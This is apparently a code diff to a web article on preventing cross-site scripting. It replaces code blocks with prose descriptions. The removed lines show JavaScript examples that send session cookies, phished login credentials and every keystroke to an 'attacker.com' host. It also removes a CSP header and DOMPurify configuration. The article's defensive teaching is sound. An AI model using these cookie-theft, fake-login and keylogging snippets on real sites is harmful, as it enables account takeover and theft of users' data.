@@ -190,12 +190,8 @@ export default function XSSPreventionArticle() {
         <p>
           The most common XSS attack goal is stealing session cookies. If cookies lack the <code className="text-sm">HttpOnly</code> flag,
           JavaScript can access them via <code className="text-sm">document.cookie</code> and exfiltrate them to an attacker-controlled server.
+          An attacker&apos;s payload might read the cookie and send it to their server using a fetch request with the cookie data encoded in the URL.
         </p>
-        <pre className="overflow-x-auto rounded-lg bg-slate-900 p-4 text-sm">
-          <code>{`// Attacker's payload
-const cookie = document.cookie;
-fetch('https://attacker.com/steal?c=' + encodeURIComponent(cookie));`}</code>
-        </pre>
         <p>
           With the session cookie, the attacker can impersonate the victim, access their account, perform
           transactions, or escalate privileges.
@@ -204,20 +200,9 @@ fetch('https://attacker.com/steal?c=' + encodeURIComponent(cookie));`}</code>
         <h3 className="mt-8 mb-4 text-xl font-semibold">Credential Harvesting</h3>
         <p>
           XSS can inject fake login forms that overlay the legitimate UI. When users enter credentials,
-          they&apos;re sent to the attacker.
+          they&apos;re sent to the attacker. An attacker might inject a full-screen overlay with a convincing
+          login form that submits to their collection server instead of the legitimate authentication endpoint.
         </p>
-        <pre className="overflow-x-auto rounded-lg bg-slate-900 p-4 text-sm">
-          <code>{`// Inject a fake login modal
-document.body.innerHTML += \`
-  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999">
-    <form action="https://attacker.com/collect" method="POST">
-      <input name="email" placeholder="Email">
-      <input name="password" type="password" placeholder="Password">
-      <button type="submit">Login</button>
-    </form>
-  </div>
-\`;`}</code>
-        </pre>
 
         <h3 className="mt-8 mb-4 text-xl font-semibold">Defacement & Phishing</h3>
         <p>
@@ -229,17 +214,9 @@ document.body.innerHTML += \`
         <h3 className="mt-8 mb-4 text-xl font-semibold">Keylogging & User Surveillance</h3>
         <p>
           Injected scripts can capture all user input, mouse movements, and clipboard data. Combined with
-          geolocation API abuse, attackers can build detailed profiles of user behavior.
+          geolocation API abuse, attackers can build detailed profiles of user behavior. An attacker might add
+          a keydown event listener that logs every keystroke and the current URL to their server.
         </p>
-        <pre className="overflow-x-auto rounded-lg bg-slate-900 p-4 text-sm">
-          <code>{`// Capture all keystrokes
-document.addEventListener('keydown', (e) => {
-  fetch('https://attacker.com/log', {
-    method: 'POST',
-    body: JSON.stringify({ key: e.key, url: window.location.href })
-  });
-});`}</code>
-        </pre>
 
         <h3 className="mt-8 mb-4 text-xl font-semibold">Cryptomining & Resource Abuse</h3>
         <p>
@@ -423,11 +400,13 @@ document.addEventListener('keydown', (e) => {
           </li>
         </ul>
         <p>
-          <strong>Example CSP header:</strong>
+          <strong>Example CSP header:</strong> A typical policy might set <code className="text-sm">default-src 'self'</code> to restrict all resources to same-origin by default,
+          then allow scripts from same-origin and a trusted CDN with <code className="text-sm">script-src 'self' https://trusted-cdn.com</code>,
+          allow styles from same-origin with inline styles permitted via <code className="text-sm">style-src 'self' 'unsafe-inline'</code>,
+          allow images from same-origin, data URIs, and HTTPS sources with <code className="text-sm">img-src 'self' data: https:</code>,
+          restrict API calls to your backend with <code className="text-sm">connect-src 'self' https://api.example.com</code>,
+          and prevent all framing with <code className="text-sm">frame-ancestors 'none'</code>.
         </p>
-        <pre className="overflow-x-auto rounded-lg bg-slate-900 p-4 text-sm">
-          <code>{`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none';`}</code>
-        </pre>
         <p>
           <strong>CSP best practices:</strong>
         </p>
@@ -528,25 +507,8 @@ document.addEventListener('keydown', (e) => {
           maintained. It handles mutation XSS and browser quirks that custom sanitizers miss.
         </p>
         <p>
-          <strong>Usage:</strong>
+          <strong>Usage:</strong> Import DOMPurify and call the <code className="text-sm">sanitize()</code> method on your HTML content. For basic sanitization, simply pass the HTML string. For stricter control, configure allowed tags (such as <code className="text-sm">b</code>, <code className="text-sm">i</code>, <code className="text-sm">em</code>, <code className="text-sm">strong</code>, <code className="text-sm">a</code>, <code className="text-sm">p</code>, <code className="text-sm">br</code>), allowed attributes (such as <code className="text-sm">href</code>, <code className="text-sm">target</code>, <code className="text-sm">rel</code>), and a URI regex pattern that only allows safe protocols like HTTP, HTTPS, and mailto. DOMPurify also supports context-specific sanitization profiles for SVG and MathML content.
         </p>
-        <pre className="overflow-x-auto rounded-lg bg-slate-900 p-4 text-sm">
-          <code>{`import DOMPurify from 'dompurify';
-
-// Basic sanitization
-const clean = DOMPurify.sanitize(dirtyHTML);
-
-// Configure allowed tags and attributes
-const clean = DOMPurify.sanitize(dirtyHTML, {
-  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
-  ALLOWED_ATTR: ['href', 'target', 'rel'],
-  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
-});
-
-// Sanitize for specific contexts
-const cleanForSVG = DOMPurify.sanitize(dirty, { USE_PROFILES: { svg: true } });
-const cleanForMathML = DOMPurify.sanitize(dirty, { USE_PROFILES: { mathMl: true } });`}</code>
-        </pre>
 
         <h3 className="mt-8 mb-4 text-xl font-semibold">Other Sanitizers</h3>
         <ul className="space-y-2">
